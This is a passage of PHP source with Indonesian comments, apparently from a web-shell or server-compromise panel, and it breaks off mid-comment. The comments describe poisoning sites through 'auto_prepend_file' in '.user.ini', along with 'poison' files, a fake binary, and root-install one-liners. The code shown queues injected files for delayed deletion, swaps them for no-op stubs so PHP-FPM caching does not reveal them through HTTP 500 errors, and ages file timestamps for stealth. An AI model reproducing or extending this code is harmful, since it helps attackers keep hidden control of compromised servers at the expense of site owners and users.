/* ============ v66.9: PENDING-DELETE (fix HTTP 500 pasca RUSAK OFF) =========
   Akar masalah: PHP-FPM meng-cache isi .user.ini (user_ini.cache_ttl,
   default 300 dtk). OFF v66.8 menghapus .p.php LANGSUNG padahal FPM masih
   memakai cache yang menunjuk auto_prepend_file=<.p.php> -> fatal
   'Failed opening' -> HTTP 500 'kadang' (tergantung cache). v66.9:
   (a) .p.php/.p2.php ditimpa STUB no-op (BUKAN dihapus) -> request yang
       masih membawa cache lama tetap 200 normal;
   (c) semua file racun dicatat di state pending .gs_pending_del, format per
       baris 'epoch|path' untuk FILE dan 'epoch|path|' (trailing pipe) untuk
       DIREKTORI (dir di-rmdir hanya bila sudah kosong);
   (d) sweeper gsp_pending_sweep() (dipanggil ringan tiap render panel)
       menghapus fisik yang epoch-nya > 600 dtk lalu menulis ulang state;
   (e) ON lagi di dalam masa tenggang: gsp_rusak_write/gsp_fakebin_write
       mencabut path dari pending (gsp_pending_remove) supaya file baru tidak
       ikut terhapus sweeper. Murni file ops — kebal disable_functions. */
function gsp_pending_path() { return gsp_imm_dir() . '/.gs_pending_del'; }
/* baca state -> array of array(epoch, path, is_dir); baris korup dibuang */
function gsp_pending_list() {
    $out = array();
    $rows = @file(gsp_pending_path(), FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!is_array($rows)) return $out;
    foreach ($rows as $ln) {
        $ln = trim($ln);
        if ($ln === '') continue;
        $isdir = (substr($ln, -1) === '|');
        if ($isdir) $ln = substr($ln, 0, -1);
        $kv = explode('|', $ln, 2);
        if (count($kv) !== 2 || !preg_match('/^\d+$/', $kv[0]) || $kv[1] === '') continue;
        $out[] = array(intval($kv[0]), $kv[1], $isdir);
    }
    return $out;
}
/* tulis ulang state dari array entri (kosong -> file dihapus) */
function gsp_pending_save($entries) {
    $f = gsp_pending_path();
    if (!is_array($entries) || count($entries) === 0) { @unlink($f); return true; }
    $txt = '';
    foreach ($entries as $e) $txt .= $e[0] . '|' . $e[1] . (!empty($e[2]) ? '|' : '') . "\n";
    if (@file_put_contents($f, $txt) === false) return false;
    @chmod($f, 0600); gsp_stealth_age($f);
    return true;
}
function gsp_pending_add($path, $is_dir) {
    $path = strval($path);
    if ($path === '') return;
    $entries = gsp_pending_list();
    foreach ($entries as $e) { if ($e[1] === $path) return; } /* sudah tercatat */
    $entries[] = array(time(), $path, $is_dir ? true : false);
    gsp_pending_save($entries);
}
function gsp_pending_remove($path) {
    $path = strval($path);
    if ($path === '') return;
    $entries = gsp_pending_list();
    $keep = array(); $hit = false;
    foreach ($entries as $e) { if ($e[1] === $path) { $hit = true; continue; } $keep[] = $e; }
    if ($hit) gsp_pending_save($keep);
}
/* SWEEPER (v66.9): hapus fisik entri yang epoch-nya > 600 dtk lalu tulis
   ulang state. Tahan gagal: file yang sudah hilang -> baris dibuang; gagal
   hapus -> baris dipertahankan (dicoba lagi render berikutnya). */
function gsp_pending_sweep() {
    $entries = gsp_pending_list();
    if (count($entries) === 0) return;
    $now = time(); $keep = array(); $changed = false;
    foreach ($entries as $e) {
        if ($now - $e[0] <= 600) { $keep[] = $e; continue; }
        $changed = true;
        if (!empty($e[2])) { /* direktori: kosongkan isi lalu rmdir */
            if (@is_dir($e[1])) {
                $g = @glob($e[1] . '/*');
                if (is_array($g)) foreach ($g as $gf) { if (@is_file($gf)) @unlink($gf); }
                if (!@rmdir($e[1])) $keep[] = $e;
            }
        } else {
            if (@is_file($e[1])) { if (!@unlink($e[1])) $keep[] = $e; }
        }
    }
    if ($changed) gsp_pending_save($keep);
}
/* SWEEPER paket one-liner INSTALL ROOT (baru v69, MISI 3): hapus dir
   ~/.cache/.gsr_* yang .gsr_ttl-nya lebih tua dari 1800 dtk (paket yang tidak
   sempat dijalankan / gagal self-clean tidak menumpuk selamanya) sekalian
   bersihkan baris state .gsr_keys yang expired. Murni file ops, tahan gagal
